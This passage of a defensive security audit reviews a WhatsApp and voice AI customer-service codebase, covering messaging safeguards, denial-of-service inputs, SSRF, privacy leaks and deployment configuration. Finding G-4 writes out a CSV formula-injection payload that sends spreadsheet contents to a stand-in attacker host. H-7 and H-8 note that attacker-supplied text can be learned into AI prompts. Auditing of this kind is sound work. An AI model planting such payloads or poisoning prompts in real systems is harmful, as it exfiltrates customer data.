`whatsapp.service.ts:135-154`. `contacts: string[]` comes straight from the body: no length cap, no check that the numbers correspond to real `Contact` rows, no DNC, no opt-out, no `Message` row, no audit. Fired detached with `.catch()` and returns `{success:true}` immediately, so a restart truncates the run with no record of who was reached. The 50 MB body limit allows on the order of a million numbers. Correctly org-scoped (`findAuthorizedConnection` is sound) — the problem is everything else.

### F-4 There is no emergency stop for outbound messaging ◻ P1
The only suppression switch is `MarketingSettings.killSwitchEnabled`, consulted **only** inside `MarketingSendService`. The webhook AI-reply path, the inbox send paths, `broadcast`, and both worker send paths have no kill switch. `Campaign.dryRun` is a read-only report, not a mode. There are no quiet hours (nothing consults `WorkingHours` on the send path), no per-org daily send cap, and no per-contact frequency cap. `safeCampaignMode` caps 20 recipients *per campaign*, so 50 campaigns send 1000 messages with "safe mode" still on.

During an incident the operator's only recourse is disconnecting the WhatsApp instance. `VoiceSettings.killSwitchEnabled` *is* honoured for calls — the pattern exists and simply was not extended.

### F-5 Duplicate-send exposure ◻ P2
- `worker/whatsapp-outgoing.processor.ts:43` POSTs with no idempotency key and no `jobId`; a delivered-but-timed-out response triggers up to 3 BullMQ retries — three deliveries of the same text.
- `Message.clientIdempotencyKey` carries a `@@unique` constraint clearly meant for client-supplied dedupe, but the service fills it with `generateCorrelationId()` on every call, so the constraint can never fire. An agent double-clicking Send delivers twice.
- `evolution.provider.ts:51` returns the literal `"unknown"` as a message id on an unexpected 2xx body while still reporting `SENT`. The second such message in an org violates the unique index — so a *delivered* message is recorded `FAILED`, or the caller gets a 500 after the send and clicks again.

**Refuted:** the campaign claim protocol genuinely prevents double-sends from concurrent loops, double-clicks, and pause races. The real defect there is the opposite — recipients stranded in `SENDING` after a restart are never reclaimed, so the campaign stalls permanently and those leads can never be enrolled elsewhere (`marketing-send.service.ts:69-73`).

### F-6 Inbound call routing is a global phone lookup ◻ P2
`voice-webhooks.controller.ts:42-50` resolves the tenant with `findFirst({ where: { normalizedPhone } })` — no org scope — while `VoiceNumber` uniqueness is only *per-org*. If tenant B registers a number tenant A owns, `findFirst` picks arbitrarily and the whole call, transcript, and cost is attributed to the wrong tenant. Requires a registration-side action, not a forged webhook (the Twilio signature check is correct) — hence P2.

### F-7 Seed data ships plausible live Saudi mobile numbers ◻ P3
`seed.ts:181-210` seeds `+966501234567` and siblings (live prefixes, not reserved test ranges) on a connection with `status:"CONNECTED"` and a conversation in `mode:"AI_AUTOMATIC"`. What actually blocks a send today is that the seeded connection has `providerInstanceId: null` — a fortunate accident, not a designed guard.

---

## 8. CLUSTER G — Availability and input handling

### G-1 One request freezes the entire API ✅ P0
`packages/ai/src/safety.ts:37`:
```ts
masked = masked.replace(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi, '[EMAIL]');
```
The leading `[a-zA-Z0-9._-]+` backtracks from every start offset when no `@` follows. I measured it directly on this machine:

| input length | time |
|---|---|
| 5,000 | 24 ms |
| 10,000 | 87 ms |
| 20,000 | 340 ms |
| 40,000 | 1,191 ms |
| 80,000 | 4,037 ms |

Cleanly quadratic. `String.replace` is synchronous, so the event loop is frozen and every other request on the process stalls. The body limit is **50 MB** and nothing caps the input before this line (`agent.ts:79` passes `context.message` raw; the marketing path slices to 4000 chars, the support path does not).

Reachable at `POST /v1/ai-agents/:id/test` with only `ai.read`, and — when `REDIS_DISABLED` makes the inline AI path active — through the **unauthenticated** Evolution webhook.

### G-2 File uploads have no size limit at all ◻ P1
`files.controller.ts:21` and `messages.controller.ts:47` use `@UseInterceptors(FileInterceptor('file'))` with **no options**, and there is no `MulterModule.register` anywhere. Multer's default `fileSize` is `Infinity` and the default storage is in-memory. The 50 MB body-parser limit covers only `json`/`urlencoded`, not `multipart/form-data`. No content-type or extension check; `mimeType` is taken verbatim from the client.

The codebase knows the right pattern — `leads.controller.ts:79` sets `limits: { fileSize: 5MB }` and validates size, extension, and MIME.

### G-3 Pagination is unbounded, and some list routes have none ◻ P1
`audit.service.ts:9`, `organizations.service.ts:29`, `campaigns.service.ts:27,49`, `dnc.service.ts:32` all pass a client `limit` straight into `take` with no ceiling — `?limit=1000000` is honoured, with relation includes. `conversations.service.ts:11-24` has **no `take` and no `skip` at all**. `parseInt("abc")` → `NaN` reaches `skip`/`take` in three controllers, and the resulting Prisma error bypasses `HttpExceptionFilter` (which is `@Catch(HttpException)` only) into an unhandled 500.

Again the correct pattern exists elsewhere: `leads.service.ts:41` and `voice-calls.service.ts:15` both clamp to `Math.min(Math.max(limit,1),100)`.

### G-4 CSV formula injection, seeded from the customer's own WhatsApp display name ◻ P1
`contacts.service.ts:59-63` and `conversations.service.ts:208-215` build CSV by string concatenation with a bare `"` wrapper — no escaping, no formula-neutralising prefix. `Contact.name` is written verbatim from `payload.data.pushName` (`webhooks.service.ts:103`), which is the sender's own display name.

A customer setting their display name to `=IMPORTXML(CONCAT("https://x.attacker/?d=",CONCATENATE(A1:E100)),"//a")` and sending one message causes exfiltration when a manager opens the export in Excel or Sheets. This stands regardless of the webhook secret, because any real customer controls their own display name.

### G-5 SSRF: the fetcher validates DNS, then re-resolves ◻ P1
`marketing/website/safe-website-fetcher.ts:32-94` resolves the hostname, rejects private ranges, and then calls `fetch(url.toString())` — undici performs its **own** independent DNS lookup. Nothing pins the validated address. An attacker-controlled nameserver answers a public IP to the validation lookup and an internal one to undici. Because the response body is summarized and stored in `WebsiteProfile.businessSummary`, readable in the UI, this is an *exfiltrating* SSRF, not a blind one.

Everything else about this fetcher held: decimal/octal/hex IP literals, bracketed IPv6, `::ffff:` mapping, credentials-in-URL, non-http schemes, `.local`/`.internal`, and per-hop redirect revalidation all fail closed. It is good code with one TOCTOU gap.

### G-6 Bulk-action writes rows into other tenants' conversations ◻ P2
`conversations.service.ts:169-199`. The `updateMany` calls are correctly org-scoped, but the two `createMany` calls take the raw client array with no org filter and no length limit. The foreign key is satisfied by the victim's row, so the insert succeeds and the attacker's tag renders inside the victim tenant's inbox. 500,000 ids fit in one 50 MB body. A non-array value hits `.map` → unhandled 500.

### G-7 Import endpoints ◻ P2
- **XLSX bomb:** `lead-import.service.ts:37-49` enforces a 5 MB limit on the *compressed* buffer, then calls `workbook.xlsx.load(buffer)` which fully inflates it; the 5000-row check happens *after* parsing.
- **`contacts/import`:** `csvData` arrives as a JSON string, so only the 50 MB body limit applies and none of the lead-import protections do. The parser is `split(',')` with a blanket quote-strip, so quoted fields containing commas shift columns silently. Each row is an *awaited* upsert in a `for` loop with errors swallowed by an empty `catch`.

### G-8 `MAX_UPLOAD_SIZE_MB` is documented under "# Security" and read by nothing ◻ P2
Its only occurrence is its own schema line. The real limit is the hardcoded `"50mb"` in `main.ts:29-31`. An operator hardening the deployment to 5 MB changes nothing.

### G-9 `GET /v1/files/:id/download` redirects to a column that does not exist ◻ P3
`uploadFile` writes the URL into `storageKey`, but the handler does `res.redirect(file.url)` and `MediaAsset` has no `url` column — so the route emits `Location: undefined`. It is non-functional. (Its sibling `getFile`/`deleteFile` are also unscoped — covered in A-6.)

---

## 9. CLUSTER H — Personal data and privacy

Full PII inventory by model is in `scratchpad/tier1-pii.md`. Nothing in this database is encrypted at rest at the application layer.

### H-1 Voice transcript masking is a display-only copy ◻ P1
`docs/AI_VOICE_FINAL_AUDIT.md:34` claims transcripts mask OTP-like values and long digit runs. `appendTranscript` writes the **unmodified** utterance to `CallTranscriptTurn.text` and puts the masked version in a *separate* `redactedText` column. `finalizeCall` then reads the **raw** column and sends it to OpenAI for summarization; the resulting `summary` is stored unredacted and returned by the call-detail API.

The masking takes effect in exactly one place — the transcript pane in the UI. Not storage, not the OpenAI input, not the summary, not the event log. The regex is also narrow: `\b\d{10}\b` catches `05XXXXXXXX` but not E.164 `9665XXXXXXXX`.

### H-2 The dead-letter processor writes whole job payloads — including customer message bodies — to logs ◻ P1
`apps/worker/src/processors/dead-letter.processor.ts:14` does `JSON.stringify(data)` on the entire failed payload, and the `aiResponse` payload contains the customer's verbatim message. When OpenAI is rate-limited and retries exhaust, every affected message body is written to stdout → the hosting provider's log aggregator, outside any retention or access policy the product controls. There is no logger redaction anywhere in the repo — 26 stock `new Logger(...)` instances, no pino/winston, no redaction config.

### H-3 `WebhookEvent.sanitizedPayload` stores the raw body, forever ◻ P1
`webhooks.service.ts:50` assigns `sanitizedPayload: payload` — the identity function under a name that promises sanitization. The value is the complete Evolution body: customer phone/JID, display name, full message text. `payloadHash` is filled with `generateCorrelationId()` — a random value, not a hash. Nothing ever prunes this table; the only scheduled cleanup deletes `usageEvent` rows. The result is a permanent unredacted second copy of every WhatsApp message ever received, in a table nobody treats as message storage.

### H-4 Customer phone numbers are logged on every inbound message ◻ P1
`webhooks.service.ts:130` logs the sender's number at `log` level on **every** inbound message. Also `whatsapp.service.ts:151` and `voice-webhooks.controller.ts:47`. `packages/shared/src/utils.ts:5` defines `maskPhone` — it is used in none of these places, nor in any logger call anywhere.

### H-5 `maskPII` is a fig leaf ◻ P1
Four independent defeats: (1) it matches only emails, 13–16 digit card runs, and US-format SSNs — Saudi phone numbers and personal names match none of them; (2) `moderateContent` posts the **raw unmasked** message to OpenAI *before* masking runs; (3) only the current turn is masked — the last 10 history messages are mapped in raw, so what is masked on turn N is transmitted verbatim on turn N+1; (4) the marketing path never calls it at all, and the voice path writes the customer's name, company, lead status, and campaign name into the Realtime `instructions` while explicitly opting into `whisper-1` transcription.

No data-processing flag is set on any egress — no zero-retention header, no `store: false`, no organization header — across all four OpenAI endpoints. `OPENAI_BASE_URL` is an unvalidated operator-supplied host with no allowlist.

### H-6 There is no retention and no deletion, anywhere ◻ P1
The only scheduled cleanup deletes `usageEvent` rows older than 30 days; lines 25-27 of the processor say "For Phase 3, we'll just log this action" and then log nothing. No message, transcript, call, webhook event, audit log, AI run, or retrieval log is ever removed or anonymized. `VoiceSettings.transcriptRetentionDays` and `recordingRetentionDays` are writable and **never read**. `DataExportRequest` / `DataDeletionRequest` appear only in the schema — zero application code references either.

A Saudi customer exercising a deletion right gets a soft-deleted contact; their message bodies, call transcripts, raw webhook payloads, AI run inputs, and auto-learned FAQ entries all remain fully readable and continue to feed AI prompts.

### H-7 Customer name, phone, and verbatim question are pushed to an unverified phone number ◻ P2
On handoff, both the queued and inline paths build a WhatsApp message containing the customer's name, phone, and question and send it to `agent.supportPhoneNumber` — a free-text field written straight from the DTO with no ownership proof, no OTP, no validation. Combined with B-4, the holder of that number can then reply as the business and have their text learned into the org's FAQ.

### H-8 Auto-learning copies verbatim customer messages into reusable knowledge ◻ P2
Correctly org-scoped, and gated behind `autoLearningEnabled` (default false) — but `maskPII` is not applied on this path at either call site. A customer message containing a name and phone number becomes a persistent FAQ entry that surfaces into *other* customers' prompts. See E-2 for the injection dimension of the same path.

### H-9 Voice tool inputs persist caller-spoken details; OTP flow is unreachable ◻ P2
`CallToolExecution.input` stores validated arguments as JSON — for `captureDetails` those are exactly the personal details the caller spoke. The API response side *is* clean (`voice-calls.service.ts:72-79` deliberately projects the field away). Separately, `VerificationService.startOtp` — the only producer of an OTP session — **has no callers anywhere**, so `otpEnabled` gates a path that cannot execute, and `VerificationSession` rows are never purged. The OTP code handling itself is sound where it exists: `randomInt`, sha256 at rest, `timingSafeEqual`, single-use, 5-minute TTL, attempt-limited, never logged.

### H-10 Demo credentials printed to console by seed and bootstrap scripts ◻ P3
`seed.ts:286-289` prints demo emails alongside plaintext passwords; `bootstrap-marketing.ts` echoes the platform owner email. Both are exposed as `package.json` scripts.

---

## 10. CLUSTER I — Configuration and operations

### I-1 `gateway.js` never watches its children — a crashed API yields a permanently 502-ing container Railway thinks is healthy ◻ P1
The gateway spawns `api`, `realtime`, and `worker` and registers **no** `exit`, `close`, or `error` listener on any of them. The parent stays up regardless. `restartPolicyType: "ON_FAILURE"` only fires when the main process exits non-zero — it never does. `healthcheckPath` gates the *deploy*, not the steady state. Net result: a container reporting Running while returning 502 to everything, indefinitely, with no automatic recovery. The worker's spawn does not even keep a reference.

### I-2 `apps/web/.env.production` is git-tracked with placeholder hostnames ◻ P2
It contains `NEXT_PUBLIC_API_URL=https://your-railway-backend.up.railway.app/v1`. Next.js inlines `NEXT_PUBLIC_*` at build time and `vercel.json` wires no env, so unless both variables are set in the Vercel dashboard the placeholders are baked into every client chunk. `apps/web/src/lib/api.ts:11` attaches the JWT from `localStorage` to every request — **including ones sent to the placeholder host**, an unregistered domain any third party can claim. The fallback is not a safety net: it only fires when the variable is *absent*, and this file makes it present.

### I-3 `z.coerce.boolean()` turns `REDIS_DISABLED=false` into `true` ◻ P2
`z.coerce.boolean()` is `Boolean(input)` — every non-empty string is `true`. An operator writing `REDIS_DISABLED=false` to be explicit silently **disables Redis**: queues off, realtime pub/sub off, the AI rate limiter off (D-3). The only safe way to say "off" is to omit the variable. `/v1/health/ready` still reports `redis: "connected"` because it pings the connection independently.

(The two feature flags with the same bug are read nowhere, so they have no runtime effect.)

### I-4 The webhook secret travels in the URL query string ◻ P2
`evolution.provider.ts:199-203` appends it as `?secret=<value>` and registers that URL with Evolution; `isValidSignature:143` accepts it back from `query.secret`. Secrets in query strings land in every access log along the path — Evolution's own, Railway's, and any intermediary — where retention is typically longer and the read audience broader than the secret store. The header form is supported at `:140` but is not what `setWebhook` uses.

### I-5 `scripts/` is not gitignored and `backup-db.cmd` writes full DB dumps into it ◻ P2
`scripts/backup-db.cmd:11` redirects `pg_dump` output into the tracked `scripts/` directory, and `.gitignore` has no `*.sql` rule. `scripts/backup_20260805_192706.sql` is already in the index — it is 0 bytes (that dump failed), so this is **not** a present breach, but the next successful run followed by `git add -A` commits password hashes, message bodies, and contact phone numbers into git history.

### I-6 Five documented secret variables are dead config ◻ P2
`SUPABASE_URL`, `SUPABASE_PUBLISHABLE_KEY`, `SUPABASE_SECRET_KEY`, `SUPABASE_JWKS_URL`, `SENTRY_DSN` — each appears only on its own schema line. No Supabase client is constructed anywhere and no Sentry SDK is installed. Two harms: `.env.example:18` instructs an operator to provision a service-role key with full database bypass for a service that never uses it, and `SENTRY_DSN` creates a false belief that production errors are reported — so the crash in I-1 goes unnoticed.

Also not implemented despite config surface: S3/MinIO (the file service fabricates URLs and uploads nothing), SMTP, n8n.

### I-7 `railway.json` and `nixpacks.toml` disagree; the latter is dead ◻ P3
`railway.json` sets `"builder": "RAILPACK"`, which does not read `nixpacks.toml`. The two things that file uniquely provides are silently dropped: the explicit `openssl` package (which Prisma's engines need) and `pnpm install --frozen-lockfile` (so the deployed dependency set may not be the reviewed one). Start and build commands happen to agree, so nothing fails today.

### I-8 `start.sh` hard-requires `REDIS_URL`, contradicting the new no-Redis mode ◻ P3
The shell check runs before Node loads the schema, so the schema default never applies. The documented degraded mode cannot be reached through the production entrypoint.

---

## 11. Explicitly checked and found sound

Recorded so these are not re-investigated:

- **The 5% discount ceiling holds on every live path.** Clamped in Zod (`.max(5)`), on product create and update, at all three prompt-build sites, and in `computeDiscountMath`, which is the only writer of `DiscountOffer`. The `Coupon` model has a percent/amount ambiguity and no tenant column — but it has **zero callers anywhere**, so the risk is entirely latent.
- **The voice tool-authorization engine.** `authorizeToolCall` is the only gate; unknown keys are stripped before the executor sees the arguments; prototype pollution is neutralized; tenancy comes from the server-side `Call` record and no tool declares a tenant identifier.
- **The Twilio webhook.** Correct HMAC-SHA1 over URL + sorted params, constant-time compare, fails closed on a missing token, idempotent status events, full admission-control chain before answering. The best-guarded surface in the repo.
- **The campaign send-claim protocol.** Atomically prevents double-sends from concurrent loops, double-clicks, and pause races; failures are recorded honestly as `FAILED` with the provider error, never as sent.
- **`MarketingSendService`** re-validates entitlement, kill switch, campaign state, DNC, and opt-out against fresh server state before every send.
- **`SafeWebsiteFetcher`** defeats every IP-encoding and scheme trick tested; only the DNS-rebinding TOCTOU (G-5) survived.
- **Marketing opt-out** genuinely stops sending: the opting-out message never reaches OpenAI, the number is added to DNC, the contact is marked, the lead is frozen. `isBlocked` fails closed on unparseable numbers.
- **WhatsApp connection routes** are the reference implementation — `findAuthorizedConnection` verifies membership explicitly rather than relying on a guard.
- **Recording really is refused server-side.** `startRecording`/`stopRecording` have no call sites, no `record` attribute is emitted, and no URL is ever generated. The audit doc is correct here.
- **Customer WhatsApp media is never stored** and is not publicly addressable; the media route is membership-checked.
- **The realtime `join-conversation` handler** correctly re-checks `{id, organizationId}` against the database; room names are server-derived.
- **No SQL injection.** Eight raw-SQL call sites, all parameterized tagged templates; `$queryRawUnsafe`/`$executeRawUnsafe` appear zero times.
- **No XSS in the web app.** No `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, or `eval` anywhere; the one data-driven `href` passes `sanitizeWebsite`.
- **No command injection or path traversal.** No user input reaches a shell or a filesystem path.
- **No stack traces or Prisma errors reach clients.** The exception filter emits a fixed shape; unhandled errors get a bare 500.
- **Prisma filter injection is blocked** — but only because `emitDecoratorMetadata` makes the global pipe coerce query params to `String`. Removing that flag, or switching a controller to `@Query() q: any`, re-opens it immediately.
- **Mass assignment** is limited to two spread sites, both over Zod-parsed or allow-listed objects.
- **Migrations** contain no destructive statements; `.env` is not tracked; `start.sh` does not run the seed in production.
